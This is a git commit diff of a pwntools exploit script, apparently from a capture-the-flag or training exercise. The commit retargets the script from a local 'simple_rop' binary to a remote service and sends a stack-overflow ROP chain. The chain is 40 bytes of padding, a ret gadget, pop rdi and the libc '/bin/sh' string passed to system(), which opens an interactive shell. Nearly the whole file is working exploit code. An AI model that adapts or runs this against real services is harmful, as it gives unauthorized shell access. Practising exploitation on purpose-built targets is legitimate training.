6b79d7652d0ddd65bf009e6b21cc6fc9f8d05482
danissimurr <rudakov.daniil.2004@mail.ru>
2026-05-19 11:34:00 +0300

    rop

--- rev3/4/sploit.py
+++ rev3/4/sploit.py
@@ -8,8 +8,8 @@ from pwn import *
 # rop = ROP(elf)
 # print(rop.rdi)
 
-p = process("./simple_rop")
-# p = remote("rev.danissimurr.ru", 1344)
+# p = process("./simple_rop")
+p = remote("rev.danissimurr.ru", 1344)
 
 pop_rdi = 0x40117e
 offset_binsh = 0x1d8678
@@ -18,5 +18,6 @@ libc = 0x00007ffff7c00000
 system = libc + offset_system
 binsh = libc + offset_binsh
 ret = 0x40120b
-p.sendlineafter(b"Hello dude!\n", b'A'*40 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system))
+p.recvuntil(b"dude!\n")
+p.sendline(b'A'*40 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system))
 p.interactive()
